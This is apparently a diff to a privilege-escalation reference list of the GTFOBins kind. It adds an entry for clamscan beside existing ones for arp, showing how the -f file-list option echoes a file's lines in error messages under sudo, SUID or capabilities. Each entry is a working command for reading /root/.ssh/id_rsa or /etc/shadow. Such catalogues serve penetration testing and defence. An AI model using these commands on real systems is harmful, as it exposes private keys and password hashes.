@@ -327,3 +327,9 @@
     - {func: file-read, code: "arp -v -f /root/.ssh/id_rsa  # SUID/cap_dac_read_search+ep or empty-caps: unparseable lines are echoed as warnings -> read any file as root"}
     - {func: suid, code: "arp -v -f file_to_read  # SUID -> arbitrary file read (id_rsa/shadow)"}
     - {func: capabilities, code: "arp -v -f file_to_read  # cap_dac_read_search+ep -> arbitrary file read"}
+
+- bin: clamscan
+  functions:
+    - {func: file-read, code: "clamscan --no-summary -f /root/.ssh/id_rsa 2>&1 | sed -nE 's/^(.*): No such file or directory$/\\1/p'  # each line of the file is echoed back in the 'X: No such file' error -> read any file"}
+    - {func: sudo, code: "sudo clamscan --no-summary -f /etc/shadow 2>&1 | grep -oP '^.*(?=: No such file)'  # sudo -> read root-only files line by line"}
+    - {func: suid, code: "clamscan --no-summary -f file_to_read 2>&1 | grep ': No such file'  # SUID -> arbitrary file read via --file-list/-f echoing each line"}
